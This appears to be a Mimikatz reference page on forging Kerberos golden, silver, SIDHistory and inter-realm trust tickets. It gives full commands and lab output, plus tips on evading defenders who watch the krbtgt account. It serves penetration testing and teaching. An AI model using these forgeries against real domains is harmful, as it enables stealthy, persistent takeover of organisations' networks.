# golden

`kerberos::golden` can be used to [forge golden and silver tickets](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets). It can also be used for forging inter-realm trust keys. It has the following command line arguments:

* `/domain`: the active directory domain (the user's domain to impersonate)
* `/sid`: the SID of the active directory domain the user's hash is hold
* `/sids`: the extra SID of the domain to target during the SIDHistory spoofing
* `/user`: username to impersonate, keep in mind that Administrator is not the only name for this well-known account
* `/ticket`: save the ticket to a `.kirbi` file
* `/groups`: id of groups the user belongs (first is primary group, comma separator) - default is: `513,512,520,518,519` for the well-known Administrators groups
* `/id`: The user RID. The default value is 500 (local administrator)
* `/target` - the server/computer name where the service is hosted (ex: `share.server.local`, `sql.server.local:1433`)
* `/service` - The service name for the silver ticket (ex: `cifs`, `rpcss`, `http`, `mssql`)
* `/ptt`: inject the generated golden ticket into memory
* `/startoffset`: The start offset when the ticket is available. Default is 0
* `/endin`: The ticket's minutes lifetime. The default value is 10 years. The default active directory kerberos policy is 10 hours
* `/renewmax`: The maximum ticket's minutes lifetime renewal. The default value is 10 years. The default active directory kerberos policy is 7 days
* `/krbtgt`: specify the krbtgt RC4 key
* `/des`: the DES key to be used
* `/rc4`: the RC4 key to be used
* `/aes128`: The AES128 key to be used. More opsec safe
* `/aes256`: the AES256 key to be used. More opsec safe
* `/claims`: [add additional values to a user’s kerberos ticket and then make access decisions based on those values at the client level](https://syfuhs.net/2017/07/29/active-directory-claims-and-kerberos-net/)
* `/rodc`: for generating a golden ticket with the krbtgt hash of a Read Only Domain Controller

### Golden Ticket

The following are the requirements for generating a [golden ticket](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets#golden-ticket).

* A KRBTGT key. It can be of type RC4 (i.e. NT hash), DES or AES (depending on what etypes the domain supports and what level of stealth the attacker wants).
* Domain name
* Domain SID
* The username to impersonate
* The RID of the user account to impersonate. The RID is the rightmost number in a full SID (e.g. 500 for the built-in administrator account)
* The group RIDs the account should be a member of. The RID is the rightmost number in a full SID (e.g. 512 for "Domain Admins", 519 for "Entreprise Admins").

```
mimikatz # kerberos::golden /domain:hacklab.local /sid:S-1-5-21-2725560159-1428537199-2260736313 /rc4:b5348d0a20a24a67ff544146a09cd292 /user:krbtgt /ticket:ticket.kirbi /groups:500,501,513,512,520,518,519
User      : krbtgt
Domain    : hacklab.local (HACKLAB)
SID       : S-1-5-21-2725560159-1428537199-2260736313
User Id   : 500
Groups Id : *500 501 513 512 520 518 519
ServiceKey: b5348d0a20a24a67ff544146a09cd292 - rc4_hmac_nt
Lifetime  : 19/11/2021 02:55:47 ; 17/11/2031 02:55:47 ; 17/11/2031 02:55:47
-> Ticket : ticket.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !
```

### Sliver Ticket

The following are the requirements for generating a [silver ticket](https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets#silver-ticket).

```
mimikatz # kerberos::golden /domain:hacklab.local /sid:S-1-5-21-2725560159-1428537199-2260736313 /rc4:647dac3559c899c5fe4dad7723feb8c5 /user:m3g9tr0n /service:CIFS/dc.hacklab.local /target:dc.hacklab.local
User      : m3g9tr0n
Domain    : hacklab.local (HACKLAB)
SID       : S-1-5-21-2725560159-1428537199-2260736313
User Id   : 500
Groups Id : *513 512 520 518 519
ServiceKey: 647dac3559c899c5fe4dad7723feb8c5 - rc4_hmac_nt
Service   : CIFS/dc.hacklab.local
Target    : dc.hacklab.local
Lifetime  : 19/11/2021 02:59:22 ; 17/11/2031 02:59:22 ; 17/11/2031 02:59:22
-> Ticket : ticket.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !
```

### Golden ticket & SIDHistory spoofing

When Forest Trust Relationship is bi-directional, it is possible to escalate from a child domain to a parent root domain by doing SIDHistory spoofing.

```
mimikatz #kerberos::golden /domain:<domain_name> /sid:<domain_sid> /rc4:<krbtgt_ntlm_hash> /user:<user_name> /ticket:ticket.kirbi /sids:<sid_of_parent_domain>

kerberos::golden /user:Administrator /domain:child.hacklab.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:krbtgt_tkt.kirbi
User      : Administrator
Domain    : child.hacklab.local (CHILD)
SID       : S-1-5-21-1874506631-3219952063-538504511
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-280534878-1496970234-700767426-519 ;
ServiceKey: ff46a9d8bd66c6efd77603da26796f35 - rc4_hmac_nt
Lifetime  : 19/11/2021 1:02:13 AM ; 5/6/2030 1:02:13 AM ; 5/6/2030 1:02:13 AM
-> Ticket : C:\krbtgt_tkt.kirbi

 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated

Final Ticket Saved to file !
```

### Inter-Realm Trust Tickets

To acquire the forest trust keys the command [`lsadump::trust /patch`](https://tools.thehacker.recipes/mimikatz/modules/lsadump/trust) has to be used. Depending on the forest trust relationship, using the trust key instead of the krbtgt account can be stealthier since most defense mechanisms are monitoring the krbtgt account.

```
mimikatz # kerberos::golden /user:<user_name> /domain:<domain_name> /sid:<domain_sid> /sids:<sid_of_target_domain> /rc4:<trust_key_RC4_key> /service:krbtgt /target:<the_target_domain> /ticket:<file_to_save>

kerberos::golden /user:Administrator /domain:hacklab.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-3146393536-1393405867-2905981701-519 /rc4:172ad9986a524aadaf4d01c1ce7f240f /service:krbtgt /target:bank.local /ticket:trust_tkt.kirbi

User      : Administrator
Domain    : hacklab.local (HACKLAB)
SID       : S-1-5-21-1874506631-3219952063-538504511
User Id   : 500
Groups Id : *513 512 520 518 519
Extra SIDs: S-1-5-21-3146393536-1393405867-2905981701-519 ;
ServiceKey: 172ad9986a524aadaf4d01c1ce7f240f - rc4_hmac_nt
Service   : krbtgt
Target    : bank.local
Lifetime  : 19/11/2021 3:01:44 AM ; 5/6/2030 3:01:44 AM ; 5/6/2030 3:01:44 AM
-> Ticket : C:\trust_tkt-us.kirbi
 * PAC generated
 * PAC signed
 * EncTicketPart generated
 * EncTicketPart encrypted
 * KrbCred generated
Final Ticket Saved to file !
```
